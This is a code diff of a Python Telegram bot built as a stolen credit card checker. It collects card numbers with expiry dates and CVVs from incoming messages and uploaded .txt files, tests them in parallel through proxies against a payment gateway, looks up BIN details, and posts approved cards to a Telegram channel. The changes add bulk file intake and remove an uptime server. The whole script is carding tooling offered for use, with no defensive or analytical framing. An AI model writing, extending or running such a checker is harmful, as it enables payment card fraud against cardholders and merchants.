@@ -1,4 +1,4 @@
-import asyncio, aiohttp, re
+import asyncio, aiohttp, re, os
 from aiohttp import ClientSession, TCPConnector
 from telethon import TelegramClient, events
 
@@ -15,7 +15,6 @@ MAX_WORKERS = 100
 checked_ccs = set()
 proxy_list = []
 
-# Load proxies (optional)
 async def load_proxies():
     global proxy_list
     try:
@@ -35,10 +34,6 @@ def parseX(data, start, end):
     except:
         return "None"
 
-async def make_request(session, url, method="POST", params=None, headers=None, data=None, json=None):
-    async with session.request(method, url, params=params, headers=headers, data=data, json=json) as response:
-        return await response.text()
-
 async def bin_lookup(bin_num, session):
     try:
         async with session.get(f"https://lookup.binlist.net/{bin_num}", timeout=10) as resp:
@@ -54,7 +49,15 @@ async def bin_lookup(bin_num, session):
         pass
     return "BIN Info Not Found"
 
-async def ppc(client, cc_data):
+# === CHECKER 1: Handles .txt file CCs only ===
+async def checker_txt(client, cc_data):
+    await ppc(client, cc_data, post_result=False)
+
+# === CHECKER 2: Handles normal message CCs ===
+async def checker_msg(client, cc_data):
+    await ppc(client, cc_data, post_result=True)
+
+async def ppc(client, cc_data, post_result=True):
     try:
         cc, mon, year, cvv = cc_data.split("|")
         year = year[-2:]
@@ -119,26 +122,30 @@ async def ppc(client, cc_data):
         if "succeeded" in res3:
             bininfo = await bin_lookup(cc[:6], my_session)
             msg = f"""
-𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
+✅ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝
 
 𝗖𝗮𝗿𝗱: {cc_data}
 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: {GATEWAY_NAME}
 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: Approved
 
-𝗜𝗻𝗳𝗼:  {bininfo}
+𝗜𝗻𝗳𝗼: {bininfo}
 """
-            try:
-                await client.send_message(CHANNEL_USERNAME, msg)
-                print(f"[✅] Sent: {cc_data}")
-            except Exception as e:
-                print(f"[❌] Failed to post: {e}")
+            if post_result:
+                try:
+                    await client.send_message(CHANNEL_USERNAME, msg)
+                    print(f"[✅] Sent: {cc_data}")
+                except Exception as e:
+                    print(f"[❌] Failed to post: {e}")
 
 async def worker(queue, client):
     while True:
-        cc = await queue.get()
+        cc, is_txt = await queue.get()
         if cc not in checked_ccs:
             checked_ccs.add(cc)
-            await ppc(client, cc)
+            if is_txt:
+                await checker_txt(client, cc)
+            else:
+                await checker_msg(client, cc)
         queue.task_done()
 
 async def main():
@@ -148,33 +155,38 @@ async def main():
 
     @client.on(events.NewMessage(incoming=True))
     async def handler(event):
-        message = event.raw_text
-        matches = re.findall(r"\b\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}\b", message)
-        for cc in matches:
-            await queue.put(cc)
+        text = event.raw_text
+        all_ccs = set()
+        is_txt = False
+
+        if event.file and event.file.name.endswith(".txt"):
+            try:
+                path = await event.download_media()
+                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
+                    for line in f:
+                        cc = re.findall(r"\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}", line)
+                        all_ccs.update(cc)
+                is_txt = True
+            except Exception as e:
+                print(f"[❌] Error reading txt: {e}")
+                return
+        else:
+            lines = text.splitlines()
+            for line in lines:
+                if '|' in line:
+                    cc = re.findall(r"\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}", line)
+                    all_ccs.update(cc)
+
+        for cc in all_ccs:
+            await queue.put((cc, is_txt))
 
     await client.start()
     print("[🟢] Listening for CCs...")
 
-    for i in range(MAX_WORKERS):
+    for _ in range(MAX_WORKERS):
         asyncio.create_task(worker(queue, client))
 
     await client.run_until_disconnected()
 
-# === Flask Uptime Server ===
-from flask import Flask
-from threading import Thread
-
-app = Flask(__name__)
-
-@app.route('/')
-def home():
-    return "Main.py is running"
-
-def run_flask():
-    app.run(host='0.0.0.0', port=8080)
-
-# === Main Start ===
 if __name__ == "__main__":
-    Thread(target=run_flask).start()  # Start Flask for UptimeRobot
-    asyncio.run(main())               # Start your async main loop
+    asyncio.run(main())
